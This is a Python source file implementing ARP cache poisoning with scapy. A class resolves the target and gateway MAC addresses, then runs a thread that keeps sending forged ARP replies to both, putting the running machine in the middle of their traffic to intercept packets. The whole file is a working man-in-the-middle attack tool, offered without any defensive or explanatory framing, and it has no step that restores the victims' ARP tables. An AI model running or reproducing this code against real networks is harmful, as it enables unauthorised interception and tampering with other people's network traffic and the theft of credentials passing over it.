import constants  # Assuming you have a constants module with necessary constants
import scapy.all as scapy
import threading
import time


class Arp:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.gateway_mac = ""
        self.target_mac = ""
        self.setup_mac()

        # Initialize locks for thread synchronization
        self.poison_thread_lock = threading.Lock()

        # Initialize threads
        self.poison_thread = None

    def start_poisoning(self):
        # Start the normal ARP poisoning thread
        self.poison_thread = threading.Thread(target=self.poison)
        self.poison_thread.start()

    def stop_poisoning(self):
        self.poison_thread_lock.acquire()
        # Wait for the normal ARP poisoning thread to join
        if self.poison_thread:
            self.poison_thread.join()
        print("Normal ARP poisoning stopped...")

    # Keep sending false ARP replies to put our machine in the middle to intercept packets
    def poison(self):
        print("Starting ARP poisoning")
        while self.poison_thread_lock.acquire(timeout=0.1):
            self.spoof_function(self.target_ip, self.target_mac, self.gateway_ip) 
            self.spoof_function(self.gateway_ip, self.gateway_mac ,self.target_ip) 
            self.poison_thread_lock.release()
            time.sleep(0.01)
        
    def spoof_function(self, target_ip, target_mac, spoof_ip): 
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
        scapy.send(packet, verbose=False) 

    # Get MAC address starting from IP address
    def get_mac(self, ip):
        print(f"Sending ARP request to {ip}")
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)

        if answered_list:
            print(f"Received ARP response from {ip}")
            return answered_list[0][1].hwsrc
        else:
            print(f"No ARP response received for {ip}")
            return None

    def setup_mac(self):
        if self.target_ip == constants.broadcast_ip:
            self.target_mac = "ff:ff:ff:ff:ff:ff"
        else:
            self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)


